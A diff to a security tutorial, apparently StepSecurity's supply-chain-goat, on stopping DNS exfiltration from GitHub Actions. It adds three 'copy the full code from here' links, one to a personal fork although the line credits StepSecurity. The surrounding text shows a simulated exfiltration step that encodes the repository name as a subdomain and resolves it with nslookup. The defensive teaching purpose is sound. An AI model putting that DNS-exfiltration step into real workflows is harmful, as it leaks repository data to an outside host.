@@ -33,6 +33,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
       with:
         egress-policy: audit
     ```
+    For a seamless experience, StepSecurity recommends copying the full code from [here](https://github.com/arjundashrath/supply-chain-goat/blob/main/sourcecodes/tut1/p3.md) and replacing the previous text entirely.
 
 4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab and then click on the `build` tab under the `ci.yml` section to view the workflow run. 
 
@@ -52,6 +53,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
           codecov.io:443
           github.com:443
     ```
+    For a seamless experience, StepSecurity recommends copying the full code from [here](https://github.com/step-security/supply-chain-goat/blob/main/sourcecodes/tut1/p7.md) and replacing the previous text entirely.
 
 8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 
 
@@ -62,6 +64,7 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
           domain=${domain//\//-}
           nslookup "${domain}"
     ```
+    For a seamless experience, StepSecurity recommends copying the full code from [here](https://github.com/step-security/supply-chain-goat/blob/main/sourcecodes/tut1/p8.md) and replacing the previous text entirely.
 
 9. This change should cause the workflow to run, as it is set to run on push.
 
